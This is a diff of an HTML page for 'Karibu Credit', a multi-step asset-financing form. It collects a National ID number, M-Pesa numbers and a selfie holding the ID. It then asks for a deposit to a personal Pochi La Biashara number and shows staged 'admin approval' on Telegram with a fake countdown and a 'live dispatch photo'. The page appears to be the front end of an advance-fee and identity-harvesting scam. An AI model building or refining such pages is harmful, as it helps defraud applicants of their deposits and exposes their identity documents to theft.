@@ -3,8 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Karibu Credit - Asset Financing</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Karibu Credit - Asset Financing Application</title>
+    <style>
+        :root {
+            --primary: #008744;
+            --primary-dark: #006633;
+            --bg: #f4f7f6;
+            --text: #1e293b;
+            --border: #cbd5e1;
+            --card-bg: #ffffff;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; padding: 20px 10px; min-height: 100vh; }
+        
+        .container { width: 100%; max-width: 650px; background: var(--card-bg); border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); padding: 25px; height: fit-content; }
+        
+        header { text-align: center; margin-bottom: 25px; border-bottom: 2px solid #e2e8f0; padding-bottom: 15px; }
+        header h1 { color: var(--primary); font-size: 1.6rem; font-weight: 700; margin-bottom: 4px; }
+        header p { color: #64748b; font-size: 0.9rem; }
+
+        /* Horizontal Stepper */
+        .stepper-horizontal { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; position: relative; }
+        .step-item { display: flex; flex-direction: column; align-items: center; z-index: 2; flex: 1; text-align: center; }
+        .step-circle { width: 32px; height: 32px; border-radius: 50%; background: #e2e8f0; color: #64748b; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 0.85rem; margin-bottom: 6px; transition: all 0.3s ease; }
+        .step-label { font-size: 0.75rem; color: #64748b; font-weight: 600; }
+        .step-line { flex-grow: 1; height: 3px; background: #e2e8f0; margin: 0 -10px 20px -10px; z-index: 1; }
+
+        .step-item.active .step-circle { background: var(--primary); color: #fff; box-shadow: 0 0 0 4px rgba(0, 135, 68, 0.15); }
+        .step-item.active .step-label { color: var(--primary); }
+        .step-item.completed .step-circle { background: var(--primary); color: #fff; }
+
+        /* Forms & Cards */
+        .form-stage { display: none; }
+        .form-stage.active { display: block; animation: fadeIn 0.3s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+        h2 { font-size: 1.2rem; color: #0f172a; margin-bottom: 15px; }
+        
+        .product-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
+        .product-card { border: 2px solid var(--border); border-radius: 8px; padding: 12px; cursor: pointer; transition: all 0.2s; display: block; position: relative; background: #fff; }
+        .product-card input[type="radio"] { position: absolute; top: 10px; right: 10px; accent-color: var(--primary); }
+        .product-card:hover { border-color: var(--primary); }
+        .product-card .icon { font-size: 1.5rem; display: block; margin-bottom: 5px; }
+        .product-card h3 { font-size: 0.95rem; color: #0f172a; margin-bottom: 4px; }
+        .product-card .model-tag { font-size: 0.7rem; background: #e0f2fe; color: #0369a1; padding: 2px 6px; border-radius: 4px; display: inline-block; margin-bottom: 6px; }
+        .product-card .deposit-text { font-size: 0.85rem; font-weight: bold; color: var(--primary); }
+
+        .input-group { margin-bottom: 16px; text-align: left; }
+        .input-group label { display: block; font-size: 0.85rem; font-weight: 600; color: #334155; margin-bottom: 6px; }
+        .input-group input { width: 100%; padding: 10px 12px; border: 1.5px solid var(--border); border-radius: 6px; font-size: 0.95rem; outline: none; transition: border-color 0.2s; }
+        .input-group input:focus { border-color: var(--primary); }
+        
+        .pochi-box { background: #f0fdf4; border: 2px dashed var(--primary); border-radius: 8px; padding: 16px; text-align: center; margin-bottom: 20px; }
+        .pochi-number-display { font-size: 1.5rem; font-weight: 800; color: var(--primary); letter-spacing: 1px; margin: 8px 0; }
+
+        .btn-primary { width: 100%; background: var(--primary); color: white; border: none; padding: 12px; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .btn-primary:hover { background: var(--primary-dark); }
+        .btn-secondary { background: #0284c7; color: white; border: none; padding: 8px 14px; border-radius: 5px; font-weight: 600; cursor: pointer; margin-top: 6px; display: inline-block; text-decoration: none; font-size: 0.85rem; }
+
+        .stk-card { text-align: center; padding: 20px 10px; }
+        .spinner-box { margin: 20px 0; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #e2e8f0; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .success-card { text-align: center; padding: 20px 0; }
+        .celebration-icon { font-size: 3rem; margin-bottom: 10px; }
+
+        @media (max-width: 480px) {
+            .product-grid { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -13,7 +82,7 @@
             <p>Fast & reliable Lipa Polepole asset financing</p>
         </header>
 
-        <!-- Horizontal Stepper (Updated to 5 Steps) -->
+        <!-- Horizontal Stepper (5 Steps) -->
         <div class="stepper-horizontal">
             <div class="step-item active" id="step-indicator-1"><div class="step-circle">1</div><div class="step-label">Model</div></div>
             <div class="step-line"></div>
@@ -43,73 +112,79 @@
                 <h2>2. Applicant Details</h2>
                 <div class="input-group"><label>National ID Number</label><input type="number" id="idNumber" placeholder="e.g. 12345678" required></div>
                 <div class="input-group"><label>M-Pesa Phone Number</label><input type="tel" id="mpesaNumber" placeholder="07XXXXXXXX or 01XXXXXXXX" pattern="^(07|01)[0-9]{8}$" required></div>
-                <div class="input-group"><label>Confirm M-Pesa Number</label><input type="tel" id="mpesaNumberConfirm" placeholder="Re-enter phone number" required><small id="phone-match-error" style="color: #dc2626; display: none;">⚠️ Numbers do not match!</small></div>
-                <div class="input-group"><label>Delivery County / Town</label><input type="text" id="location" placeholder="e.g. Nairobi, Westlands" required></div>
+                <div class="input-group"><label>Confirm M-Pesa Number</label><input type="tel" id="mpesaNumberConfirm" placeholder="Re-enter phone number" required><small id="phone-match-error" style="color: #dc2626; display: none;">⚠️ Phone numbers do not match!</small></div>
+                <div class="input-group"><label>Delivery Location (County / Town)</label><input type="text" id="location" placeholder="e.g. Westlands, Nairobi" required></div>
             </div>
 
-            <!-- STAGE 3: Identity Selfie Photo Upload -->
+            <!-- STAGE 3: Identity Verification Selfie -->
             <div class="form-stage" id="stage-3">
-                <h2>3. Identity Selfie Photo</h2>
-                <p style="font-size: 0.9rem; color: #555; margin-bottom: 15px;">Please upload or take a clear selfie photo holding your National ID for verification.</p>
+                <h2>3. Verification Selfie</h2>
+                <p style="font-size: 0.85rem; color: #64748b; margin-bottom: 15px;">Please take or upload a photo of yourself holding your National ID to confirm your identity.</p>
                 <div class="input-group">
-                    <label>Selfie Image</label>
+                    <label>Upload Selfie</label>
                     <input type="file" id="selfiePhoto" accept="image/*" capture="user" required>
-                    <small id="selfie-error" style="color: #dc2626; display: none;">⚠️ Please upload a clear selfie photo to proceed.</small>
+                    <small id="selfie-error" style="color: #dc2626; display: none; margin-top: 5px;">⚠️ Please upload a selfie photo to proceed.</small>
                 </div>
                 <div id="selfie-preview-container" style="display: none; text-align: center; margin-top: 15px;">
-                    <p style="font-weight: bold; color: #008744;">Preview:</p>
-                    <img id="selfie-preview" src="" alt="Selfie Preview" style="max-width: 200px; max-height: 200px; border-radius: 8px; border: 2px solid #008744;">
+                    <p style="font-weight: 600; color: #008744; font-size: 0.85rem;">Preview:</p>
+                    <img id="selfie-preview" src="" alt="Selfie Preview" style="max-width: 180px; max-height: 180px; border-radius: 8px; border: 2px solid #008744; margin-top: 5px;">
                 </div>
             </div>
 
-            <!-- STAGE 4: Deposit Details -->
+            <!-- STAGE 4: Payment Details -->
             <div class="form-stage" id="stage-4">
-                <h2>4. Enter Deposit Details</h2>
+                <h2>4. M-Pesa Payment Target</h2>
                 <div class="pochi-box">
-                    <p>Selected Model: <strong id="selected-model-title" style="color:#008744;">Model</strong></p>
-                    <div class="input-group" style="margin-top: 15px; text-align: left;">
-                        <label>M-Pesa Wallet Number</label>
+                    <p style="font-size: 0.85rem; color: #334155;">Selected Product: <strong id="selected-model-title" style="color:#008744;">Model</strong></p>
+                    <p style="font-size: 0.85rem; color: #334155; margin-top: 4px;">Pochi La Biashara Number:</p>
+                    <div class="pochi-number-display" id="pochi-number">0757648339</div>
+                    
+                    <button type="button" id="copy-pochi-btn" class="btn-secondary">📋 Copy Pochi Number</button>
+                    <span id="copy-status-msg" style="display: block; color: #008744; font-size: 0.8rem; font-weight: 600; margin-top: 6px;"></span>
+
+                    <div class="input-group" style="margin-top: 15px;">
+                        <label>Your Paying M-Pesa Number</label>
                         <input type="tel" id="walletNumber" placeholder="07XXXXXXXX" required>
                     </div>
-                    <div class="input-group" style="text-align: left;">
-                        <label>Amount (KES)</label>
-                        <input type="number" id="depositAmount" placeholder="12000" readonly>
+                    <div class="input-group">
+                        <label>Deposit Amount (KES)</label>
+                        <input type="number" id="depositAmount" readonly>
                     </div>
                 </div>
-                <button type="button" id="i-have-paid-btn" class="btn-primary">Submit Payment & Request Approval</button>
+                <button type="button" id="i-have-paid-btn" class="btn-primary">I Have Made Payment - Proceed</button>
             </div>
 
-            <!-- STAGE 5: Verification & Countdown -->
+            <!-- STAGE 5: Verification & Telegram Bot Delivery -->
             <div class="form-stage" id="stage-5">
-                <h2>5. Verifying Transaction</h2>
+                <h2>5. Processing Application</h2>
 
                 <div id="admin-photo-container" style="display: none; margin-bottom: 20px; text-align: center;">
-                    <p style="font-weight: bold; color: #008744;">📸 Live Item Photo Sent From Admin:</p>
-                    <img id="item-live-photo" src="" alt="Item Photo" style="max-width: 100%; height: auto; border-radius: 8px; border: 2px solid #008744;">
+                    <p style="font-weight: 600; color: #008744; margin-bottom: 8px;">📸 Live Dispatch Item Photo from Admin:</p>
+                    <img id="item-live-photo" src="" alt="Item Photo" style="max-width: 100%; max-height: 250px; border-radius: 8px; border: 2px solid #008744;">
                 </div>
 
                 <div class="stk-card" id="countdown-card">
-                    <h3>Sending Request to Admin...</h3>
+                    <h3>Submitting Details to Admin...</h3>
                     <div class="spinner-box">
                         <div class="spinner"></div>
-                        <h1 id="countdown-timer" style="font-size: 3rem; color: #008744; margin: 15px 0;">10</h1>
-                        <p class="pin-notice">Prompting transaction verification...</p>
+                        <h1 id="countdown-timer" style="font-size: 2.8rem; color: #008744; margin: 12px 0;">10</h1>
+                        <p style="font-size: 0.85rem; color: #64748b;">Please wait while your deposit notification is dispatched to admin bot for approval...</p>
                     </div>
                 </div>
                 
                 <div class="stk-card" id="verification-card" style="display: none;">
                     <h3>Awaiting Admin Approval</h3>
-                    <p>Your details have been submitted. Please wait while your deposit is reviewed by admin.</p>
+                    <p style="font-size: 0.9rem; color: #475569; margin-top: 10px;">Application sent successfully! Please wait while admin approves your transaction on Telegram.</p>
                     <div class="spinner-box"><div class="spinner"></div></div>
                 </div>
             </div>
 
-            <!-- STAGE 6: Success -->
+            <!-- STAGE 6: Success Page -->
             <div class="form-stage" id="stage-6">
                 <div class="success-card">
                     <div class="celebration-icon">🎊 🥳</div>
-                    <h2>PAYMENT SUCCESSFUL!</h2>
-                    <p>Your deposit for <strong id="success-model-name">model</strong> has been confirmed! Delivery will proceed to your location shortly.</p>
+                    <h2 style="color: #008744;">PAYMENT APPROVED!</h2>
+                    <p style="color: #334155; margin-top: 8px;">Your deposit for <strong id="success-model-name">model</strong> has been verified. Delivery is scheduled for your address shortly.</p>
                 </div>
             </div>
         </form>
